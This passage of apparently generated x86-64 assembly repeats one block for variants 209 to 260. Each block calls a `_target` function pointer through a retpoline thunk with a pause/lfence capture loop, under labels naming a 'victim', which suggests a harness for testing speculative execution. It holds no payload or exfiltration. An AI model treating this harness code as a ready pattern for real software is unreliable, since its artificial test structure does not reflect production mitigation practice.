.Lgg_retpol_setup_000208:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000208:
	jmp	.Lvictim_win0_continue
## Variant 209
.Lvictim_win0_var209:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000209
	jmp	.Lgg_retpol_after_000209
.Lgg_retpol_thunk_000209:
	callq	.Lgg_retpol_setup_000209
.Lgg_retpol_cap_000209:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000209
.Lgg_retpol_setup_000209:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000209:
	jmp	.Lvictim_win0_continue
## Variant 210
.Lvictim_win0_var210:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000210
	jmp	.Lgg_retpol_after_000210
.Lgg_retpol_thunk_000210:
	callq	.Lgg_retpol_setup_000210
.Lgg_retpol_cap_000210:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000210
.Lgg_retpol_setup_000210:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000210:
	jmp	.Lvictim_win0_continue
## Variant 211
.Lvictim_win0_var211:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000211
	jmp	.Lgg_retpol_after_000211
.Lgg_retpol_thunk_000211:
	callq	.Lgg_retpol_setup_000211
.Lgg_retpol_cap_000211:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000211
.Lgg_retpol_setup_000211:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000211:
	jmp	.Lvictim_win0_continue
## Variant 212
.Lvictim_win0_var212:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000212
	jmp	.Lgg_retpol_after_000212
.Lgg_retpol_thunk_000212:
	callq	.Lgg_retpol_setup_000212
.Lgg_retpol_cap_000212:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000212
.Lgg_retpol_setup_000212:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000212:
	jmp	.Lvictim_win0_continue
## Variant 213
.Lvictim_win0_var213:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000213
	jmp	.Lgg_retpol_after_000213
.Lgg_retpol_thunk_000213:
	callq	.Lgg_retpol_setup_000213
.Lgg_retpol_cap_000213:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000213
.Lgg_retpol_setup_000213:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000213:
	jmp	.Lvictim_win0_continue
## Variant 214
.Lvictim_win0_var214:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000214
	jmp	.Lgg_retpol_after_000214
.Lgg_retpol_thunk_000214:
	callq	.Lgg_retpol_setup_000214
.Lgg_retpol_cap_000214:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000214
.Lgg_retpol_setup_000214:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000214:
	jmp	.Lvictim_win0_continue
## Variant 215
.Lvictim_win0_var215:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000215
	jmp	.Lgg_retpol_after_000215
.Lgg_retpol_thunk_000215:
	callq	.Lgg_retpol_setup_000215
.Lgg_retpol_cap_000215:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000215
.Lgg_retpol_setup_000215:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000215:
	jmp	.Lvictim_win0_continue
## Variant 216
.Lvictim_win0_var216:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000216
	jmp	.Lgg_retpol_after_000216
.Lgg_retpol_thunk_000216:
	callq	.Lgg_retpol_setup_000216
.Lgg_retpol_cap_000216:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000216
.Lgg_retpol_setup_000216:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000216:
	jmp	.Lvictim_win0_continue
## Variant 217
.Lvictim_win0_var217:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000217
	jmp	.Lgg_retpol_after_000217
.Lgg_retpol_thunk_000217:
	callq	.Lgg_retpol_setup_000217
.Lgg_retpol_cap_000217:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000217
.Lgg_retpol_setup_000217:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000217:
	jmp	.Lvictim_win0_continue
## Variant 218
.Lvictim_win0_var218:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000218
	jmp	.Lgg_retpol_after_000218
.Lgg_retpol_thunk_000218:
	callq	.Lgg_retpol_setup_000218
.Lgg_retpol_cap_000218:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000218
.Lgg_retpol_setup_000218:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000218:
	jmp	.Lvictim_win0_continue
## Variant 219
.Lvictim_win0_var219:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000219
	jmp	.Lgg_retpol_after_000219
.Lgg_retpol_thunk_000219:
	callq	.Lgg_retpol_setup_000219
.Lgg_retpol_cap_000219:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000219
.Lgg_retpol_setup_000219:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000219:
	jmp	.Lvictim_win0_continue
## Variant 220
.Lvictim_win0_var220:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000220
	jmp	.Lgg_retpol_after_000220
.Lgg_retpol_thunk_000220:
	callq	.Lgg_retpol_setup_000220
.Lgg_retpol_cap_000220:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000220
.Lgg_retpol_setup_000220:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000220:
	jmp	.Lvictim_win0_continue
## Variant 221
.Lvictim_win0_var221:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000221
	jmp	.Lgg_retpol_after_000221
.Lgg_retpol_thunk_000221:
	callq	.Lgg_retpol_setup_000221
.Lgg_retpol_cap_000221:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000221
.Lgg_retpol_setup_000221:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000221:
	jmp	.Lvictim_win0_continue
## Variant 222
.Lvictim_win0_var222:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000222
	jmp	.Lgg_retpol_after_000222
.Lgg_retpol_thunk_000222:
	callq	.Lgg_retpol_setup_000222
.Lgg_retpol_cap_000222:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000222
.Lgg_retpol_setup_000222:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000222:
	jmp	.Lvictim_win0_continue
## Variant 223
.Lvictim_win0_var223:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000223
	jmp	.Lgg_retpol_after_000223
.Lgg_retpol_thunk_000223:
	callq	.Lgg_retpol_setup_000223
.Lgg_retpol_cap_000223:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000223
.Lgg_retpol_setup_000223:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000223:
	jmp	.Lvictim_win0_continue
## Variant 224
.Lvictim_win0_var224:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000224
	jmp	.Lgg_retpol_after_000224
.Lgg_retpol_thunk_000224:
	callq	.Lgg_retpol_setup_000224
.Lgg_retpol_cap_000224:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000224
.Lgg_retpol_setup_000224:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000224:
	jmp	.Lvictim_win0_continue
## Variant 225
.Lvictim_win0_var225:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000225
	jmp	.Lgg_retpol_after_000225
.Lgg_retpol_thunk_000225:
	callq	.Lgg_retpol_setup_000225
.Lgg_retpol_cap_000225:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000225
.Lgg_retpol_setup_000225:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000225:
	jmp	.Lvictim_win0_continue
## Variant 226
.Lvictim_win0_var226:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000226
	jmp	.Lgg_retpol_after_000226
.Lgg_retpol_thunk_000226:
	callq	.Lgg_retpol_setup_000226
.Lgg_retpol_cap_000226:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000226
.Lgg_retpol_setup_000226:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000226:
	jmp	.Lvictim_win0_continue
## Variant 227
.Lvictim_win0_var227:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000227
	jmp	.Lgg_retpol_after_000227
.Lgg_retpol_thunk_000227:
	callq	.Lgg_retpol_setup_000227
.Lgg_retpol_cap_000227:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000227
.Lgg_retpol_setup_000227:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000227:
	jmp	.Lvictim_win0_continue
## Variant 228
.Lvictim_win0_var228:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000228
	jmp	.Lgg_retpol_after_000228
.Lgg_retpol_thunk_000228:
	callq	.Lgg_retpol_setup_000228
.Lgg_retpol_cap_000228:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000228
.Lgg_retpol_setup_000228:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000228:
	jmp	.Lvictim_win0_continue
## Variant 229
.Lvictim_win0_var229:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000229
	jmp	.Lgg_retpol_after_000229
.Lgg_retpol_thunk_000229:
	callq	.Lgg_retpol_setup_000229
.Lgg_retpol_cap_000229:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000229
.Lgg_retpol_setup_000229:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000229:
	jmp	.Lvictim_win0_continue
## Variant 230
.Lvictim_win0_var230:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000230
	jmp	.Lgg_retpol_after_000230
.Lgg_retpol_thunk_000230:
	callq	.Lgg_retpol_setup_000230
.Lgg_retpol_cap_000230:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000230
.Lgg_retpol_setup_000230:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000230:
	jmp	.Lvictim_win0_continue
## Variant 231
.Lvictim_win0_var231:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000231
	jmp	.Lgg_retpol_after_000231
.Lgg_retpol_thunk_000231:
	callq	.Lgg_retpol_setup_000231
.Lgg_retpol_cap_000231:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000231
.Lgg_retpol_setup_000231:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000231:
	jmp	.Lvictim_win0_continue
## Variant 232
.Lvictim_win0_var232:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000232
	jmp	.Lgg_retpol_after_000232
.Lgg_retpol_thunk_000232:
	callq	.Lgg_retpol_setup_000232
.Lgg_retpol_cap_000232:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000232
.Lgg_retpol_setup_000232:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000232:
	jmp	.Lvictim_win0_continue
## Variant 233
.Lvictim_win0_var233:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000233
	jmp	.Lgg_retpol_after_000233
.Lgg_retpol_thunk_000233:
	callq	.Lgg_retpol_setup_000233
.Lgg_retpol_cap_000233:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000233
.Lgg_retpol_setup_000233:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000233:
	jmp	.Lvictim_win0_continue
## Variant 234
.Lvictim_win0_var234:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000234
	jmp	.Lgg_retpol_after_000234
.Lgg_retpol_thunk_000234:
	callq	.Lgg_retpol_setup_000234
.Lgg_retpol_cap_000234:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000234
.Lgg_retpol_setup_000234:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000234:
	jmp	.Lvictim_win0_continue
## Variant 235
.Lvictim_win0_var235:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000235
	jmp	.Lgg_retpol_after_000235
.Lgg_retpol_thunk_000235:
	callq	.Lgg_retpol_setup_000235
.Lgg_retpol_cap_000235:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000235
.Lgg_retpol_setup_000235:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000235:
	jmp	.Lvictim_win0_continue
## Variant 236
.Lvictim_win0_var236:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000236
	jmp	.Lgg_retpol_after_000236
.Lgg_retpol_thunk_000236:
	callq	.Lgg_retpol_setup_000236
.Lgg_retpol_cap_000236:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000236
.Lgg_retpol_setup_000236:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000236:
	jmp	.Lvictim_win0_continue
## Variant 237
.Lvictim_win0_var237:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000237
	jmp	.Lgg_retpol_after_000237
.Lgg_retpol_thunk_000237:
	callq	.Lgg_retpol_setup_000237
.Lgg_retpol_cap_000237:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000237
.Lgg_retpol_setup_000237:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000237:
	jmp	.Lvictim_win0_continue
## Variant 238
.Lvictim_win0_var238:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000238
	jmp	.Lgg_retpol_after_000238
.Lgg_retpol_thunk_000238:
	callq	.Lgg_retpol_setup_000238
.Lgg_retpol_cap_000238:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000238
.Lgg_retpol_setup_000238:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000238:
	jmp	.Lvictim_win0_continue
## Variant 239
.Lvictim_win0_var239:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000239
	jmp	.Lgg_retpol_after_000239
.Lgg_retpol_thunk_000239:
	callq	.Lgg_retpol_setup_000239
.Lgg_retpol_cap_000239:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000239
.Lgg_retpol_setup_000239:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000239:
	jmp	.Lvictim_win0_continue
## Variant 240
.Lvictim_win0_var240:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000240
	jmp	.Lgg_retpol_after_000240
.Lgg_retpol_thunk_000240:
	callq	.Lgg_retpol_setup_000240
.Lgg_retpol_cap_000240:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000240
.Lgg_retpol_setup_000240:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000240:
	jmp	.Lvictim_win0_continue
## Variant 241
.Lvictim_win0_var241:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000241
	jmp	.Lgg_retpol_after_000241
.Lgg_retpol_thunk_000241:
	callq	.Lgg_retpol_setup_000241
.Lgg_retpol_cap_000241:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000241
.Lgg_retpol_setup_000241:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000241:
	jmp	.Lvictim_win0_continue
## Variant 242
.Lvictim_win0_var242:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000242
	jmp	.Lgg_retpol_after_000242
.Lgg_retpol_thunk_000242:
	callq	.Lgg_retpol_setup_000242
.Lgg_retpol_cap_000242:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000242
.Lgg_retpol_setup_000242:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000242:
	jmp	.Lvictim_win0_continue
## Variant 243
.Lvictim_win0_var243:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000243
	jmp	.Lgg_retpol_after_000243
.Lgg_retpol_thunk_000243:
	callq	.Lgg_retpol_setup_000243
.Lgg_retpol_cap_000243:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000243
.Lgg_retpol_setup_000243:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000243:
	jmp	.Lvictim_win0_continue
## Variant 244
.Lvictim_win0_var244:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000244
	jmp	.Lgg_retpol_after_000244
.Lgg_retpol_thunk_000244:
	callq	.Lgg_retpol_setup_000244
.Lgg_retpol_cap_000244:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000244
.Lgg_retpol_setup_000244:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000244:
	jmp	.Lvictim_win0_continue
## Variant 245
.Lvictim_win0_var245:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000245
	jmp	.Lgg_retpol_after_000245
.Lgg_retpol_thunk_000245:
	callq	.Lgg_retpol_setup_000245
.Lgg_retpol_cap_000245:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000245
.Lgg_retpol_setup_000245:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000245:
	jmp	.Lvictim_win0_continue
## Variant 246
.Lvictim_win0_var246:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000246
	jmp	.Lgg_retpol_after_000246
.Lgg_retpol_thunk_000246:
	callq	.Lgg_retpol_setup_000246
.Lgg_retpol_cap_000246:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000246
.Lgg_retpol_setup_000246:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000246:
	jmp	.Lvictim_win0_continue
## Variant 247
.Lvictim_win0_var247:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000247
	jmp	.Lgg_retpol_after_000247
.Lgg_retpol_thunk_000247:
	callq	.Lgg_retpol_setup_000247
.Lgg_retpol_cap_000247:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000247
.Lgg_retpol_setup_000247:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000247:
	jmp	.Lvictim_win0_continue
## Variant 248
.Lvictim_win0_var248:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000248
	jmp	.Lgg_retpol_after_000248
.Lgg_retpol_thunk_000248:
	callq	.Lgg_retpol_setup_000248
.Lgg_retpol_cap_000248:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000248
.Lgg_retpol_setup_000248:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000248:
	jmp	.Lvictim_win0_continue
## Variant 249
.Lvictim_win0_var249:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000249
	jmp	.Lgg_retpol_after_000249
.Lgg_retpol_thunk_000249:
	callq	.Lgg_retpol_setup_000249
.Lgg_retpol_cap_000249:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000249
.Lgg_retpol_setup_000249:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000249:
	jmp	.Lvictim_win0_continue
## Variant 250
.Lvictim_win0_var250:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000250
	jmp	.Lgg_retpol_after_000250
.Lgg_retpol_thunk_000250:
	callq	.Lgg_retpol_setup_000250
.Lgg_retpol_cap_000250:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000250
.Lgg_retpol_setup_000250:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000250:
	jmp	.Lvictim_win0_continue
## Variant 251
.Lvictim_win0_var251:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000251
	jmp	.Lgg_retpol_after_000251
.Lgg_retpol_thunk_000251:
	callq	.Lgg_retpol_setup_000251
.Lgg_retpol_cap_000251:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000251
.Lgg_retpol_setup_000251:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000251:
	jmp	.Lvictim_win0_continue
## Variant 252
.Lvictim_win0_var252:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000252
	jmp	.Lgg_retpol_after_000252
.Lgg_retpol_thunk_000252:
	callq	.Lgg_retpol_setup_000252
.Lgg_retpol_cap_000252:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000252
.Lgg_retpol_setup_000252:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000252:
	jmp	.Lvictim_win0_continue
## Variant 253
.Lvictim_win0_var253:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000253
	jmp	.Lgg_retpol_after_000253
.Lgg_retpol_thunk_000253:
	callq	.Lgg_retpol_setup_000253
.Lgg_retpol_cap_000253:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000253
.Lgg_retpol_setup_000253:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000253:
	jmp	.Lvictim_win0_continue
## Variant 254
.Lvictim_win0_var254:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000254
	jmp	.Lgg_retpol_after_000254
.Lgg_retpol_thunk_000254:
	callq	.Lgg_retpol_setup_000254
.Lgg_retpol_cap_000254:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000254
.Lgg_retpol_setup_000254:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000254:
	jmp	.Lvictim_win0_continue
## Variant 255
.Lvictim_win0_var255:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000255
	jmp	.Lgg_retpol_after_000255
.Lgg_retpol_thunk_000255:
	callq	.Lgg_retpol_setup_000255
.Lgg_retpol_cap_000255:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000255
.Lgg_retpol_setup_000255:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000255:
	jmp	.Lvictim_win0_continue
## Variant 256
.Lvictim_win0_var256:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000256
	jmp	.Lgg_retpol_after_000256
.Lgg_retpol_thunk_000256:
	callq	.Lgg_retpol_setup_000256
.Lgg_retpol_cap_000256:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000256
.Lgg_retpol_setup_000256:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000256:
	jmp	.Lvictim_win0_continue
## Variant 257
.Lvictim_win0_var257:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000257
	jmp	.Lgg_retpol_after_000257
.Lgg_retpol_thunk_000257:
	callq	.Lgg_retpol_setup_000257
.Lgg_retpol_cap_000257:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000257
.Lgg_retpol_setup_000257:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000257:
	jmp	.Lvictim_win0_continue
## Variant 258
.Lvictim_win0_var258:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000258
	jmp	.Lgg_retpol_after_000258
.Lgg_retpol_thunk_000258:
	callq	.Lgg_retpol_setup_000258
.Lgg_retpol_cap_000258:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000258
.Lgg_retpol_setup_000258:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000258:
	jmp	.Lvictim_win0_continue
## Variant 259
.Lvictim_win0_var259:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000259
	jmp	.Lgg_retpol_after_000259
.Lgg_retpol_thunk_000259:
	callq	.Lgg_retpol_setup_000259
.Lgg_retpol_cap_000259:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000259
.Lgg_retpol_setup_000259:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000259:
	jmp	.Lvictim_win0_continue
## Variant 260
.Lvictim_win0_var260:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000260
	jmp	.Lgg_retpol_after_000260
.Lgg_retpol_thunk_000260:
	callq	.Lgg_retpol_setup_000260
.Lgg_retpol_cap_000260:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000260
.Lgg_retpol_setup_000260:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000260:
	jmp	.Lvictim_win0_continue
